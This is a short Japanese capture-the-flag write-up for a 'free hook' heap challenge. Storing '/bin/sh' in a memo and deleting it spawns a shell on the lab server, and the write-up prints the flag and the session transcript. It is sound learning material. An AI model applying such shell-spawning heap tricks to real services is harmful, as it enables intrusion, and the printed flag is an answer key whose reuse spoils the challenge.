# free hook (213pt Easy)

`nc free.pwn.wanictf.org 9002`

## ヒント
- free_hookの仕組みを理解する必要があります。

## 使用ツール例
- netcat (nc)

## gccのセキュリティ保護
- Partial RELocation ReadOnly (RELRO)
- Stack Smash Protection (SSP)無効
- No eXecute bit(NX)有効
- Position Independent Executable (PIE)無効

# やったこと

```
$ nc free.pwn.wanictf.org 9002
1: add memo
2: view memo
9: del memo
command?: 2
index?[0-9]: 1
Segmentation fault (core dumped)
```

メモ帳アプリみたいです．

存在しないindexのメモを見ようとするとSegmentation faultが発生しました．

おもむろに，メモ帳に"/bin/sh"を書いたのち，削除してみるとなんかshellが立ち上がりました．

```
$ nc free.pwn.wanictf.org 9002
1: add memo
2: view memo
9: del memo
command?: 1
index?[0-9]: 1
memo?: /bin/sh



[[[list memos]]]
***** 1 *****
/bin/sh


1: add memo
2: view memo
9: del memo
command?: 9
index?[0-9]: 1
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{malloc_hook_is_a_tech_for_heap_exploitation}
```

flag.txtを見るとフラグがありました．

# フラグ
FLAG{malloc_hook_is_a_tech_for_heap_exploitation}

# メモ
何故かとれてしまった．後で復習します．
